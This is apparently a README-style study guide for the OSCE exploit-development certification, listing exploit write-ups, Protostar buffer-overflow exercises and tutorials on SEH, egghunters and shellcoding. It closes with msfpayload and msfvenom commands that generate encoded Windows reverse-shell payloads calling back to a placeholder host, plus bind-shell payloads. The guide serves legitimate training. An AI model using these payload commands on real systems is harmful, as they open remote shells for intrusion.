<p align="center">
  <img width="300" height="300" src="https://github.com/bigb0sss/OSCE/blob/master/osce.png">
</p>

## Exploit Writeups
* Backdooring PE - [Weaponizing Your Favorite PE](https://medium.com/@bigb0ss/expdev-weaponizing-your-favorite-pe-portable-executable-exploit-c268c0c076c7)
* SEH + Egghunter - [Winamp 5.12 Exploitation using Egghunter](https://medium.com/@bigb0ss/expdev-winamp-5-12-exploitation-using-egghunter-6efb2c8a863b)
* SEH + Egghunter(Manual Encoding) - [HP OpenView NNM 7.5 Exploitation](https://medium.com/@bigb0ss/expdev-hp-openview-nnm-7-5-exploitation-seh-egghunter-b25ea5fab43f)

### Exploit Exercise ([Protostar](http://exploit-exercises.lains.space/protostar/))
|Module |Link   |Note  |
| :---  | :---  | :---
|Stack0 |[Stack BOF Intro](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack0-214e8cbccb04)   | |
|Stack1 |[Stack BOF Basic1](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack1-2f28302559fc)  | |
|Stack2 |[Stack BOF Basic2](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack2-d6cb2e467853)  | |
|Stack3 |[Stack BOF Basic3](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack3-7db54291f867)  | |
|Stack4 |[Stack BOF Basic4](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-4-bde92b7b6b38) | |
|Stack5 |[Stack BOF Shellcode](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-5-c8d085c914e6) | |
|Stack6 |[Stack BOF ret2libc](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6)  | ROP is no need for OSCE |
|Stack7 |[Stack BOF ret2.text](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-7-fea3ac85ffe7) | ROP is no need for OSCE. But learn POP; POP; RET concept with this |

## Links
* Study Plan - https://www.abatchy.com/2017/03/osce-study-plan
* Prep Guide - https://tulpa-security.com/2017/07/18/288/
* Mona.py - https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

## Reviews
* Techryptic - [Great Tips](https://techryptic.github.io/2018/12/28/Study-Guide-&-Tips-Offensive-Security-Certified-Expert-(OSCE)-Cracking-The-Perimeter-(CTP)/)
* Jack Halon - https://jhalon.github.io/OSCE-Review/

## Github
* Examples - https://github.com/dhn/OSCE
* OSCE_Bible - https://github.com/mohitkhemchandani/OSCE_BIBLE
* FullShade - https://github.com/FULLSHADE/OSCE (*POCs)
* h0mbre - https://github.com/h0mbre/CTP-OSCE (*Good helpers)
* ihack4falafel - https://github.com/ihack4falafel/OSCE

## Resources
* Corelan - https://www.corelan.be/index.php/articles/
  * [Exploit Writing Part 1 - Stack-based Overflow](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  * [Exploit Writing Part 2 - Buffer Overflow](https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/)
  
* FuzzSecurity - http://fuzzysecurity.com/tutorials.html

* SecuritySift - http://www.securitysift.com/
  * [Windows Exploit Development Part 1 - Basics](http://www.securitysift.com/windows-exploit-development-part-1-basics/)
  * [Windows Exploit Development Part 2 - Stack-based Overflow](http://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/)
  * [Windows Exploit Development Part 3 - Offsets](http://www.securitysift.com/windows-exploit-development-part-3-changing-offsets-and-rebased-modules/)
  * [Windows Exploit Development Part 4 - Locating Shellcode JMP](http://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/)

* Fuzzing
  * https://resources.infosecinstitute.com/intro-to-fuzzing/
  * https://resources.infosecinstitute.com/fuzzer-automation-with-spike/

* Structured Exception Handler (SEH)
  * [Exploit Writing Part 3-1 - SEH](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)
  * [Exploit Writing Part 3-2 - SEH](https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/)
  * [Windows Exploit Development Part 6 - SEH](http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/)

* Egghunter
  * http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
  * [Exploit Writing Part 8 - Egghunting](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)
  * [Windows Exploit Development Part 5 - Egghunting](http://www.securitysift.com/windows-exploit-development-part-5-locating-shellcode-egghunting/)

* ASLR
  * [Exploit Writing Part 6 - ASLR](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)

* Shellcoding
  * [Exploit Wrting Part 9 - Shellcoding](https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/)
  * https://www.fuzzysecurity.com/tutorials/expDev/6.html
  * http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/
  * http://www.vividmachines.com/shellcode/shellcode.html#ws

* Web Application
  * XSS - https://excess-xss.com/
  * XSS - https://www.veracode.com/security/xss
<br>

## Reverse Shell
### Windows XP/Vista Ultimate
```bash
/pentest/exploits/framework/msfpayload windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 C
```
### Later Windows
```bash
/pentest/exploits/framework/msfpayload windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 C 

msfvenom -p windows/shell_reverse_tcp LHOST=1192.168.x.x LPORT=443 -a x86 --platform=win -e x86/alpha_mixed -f raw
```

## Bind Shell
### Windows XP/Vista Ultimate
```bash
msfpayload windows/shell_bind_tcp R > bind
msfencode -e x86/alpha_mixed -i bind -t perl
```
### Later Windows
```bash
msfvenom -p windows/shell_bind_tcp -a x86 --platform=win -e x86/alpha_mixed -f perl
```


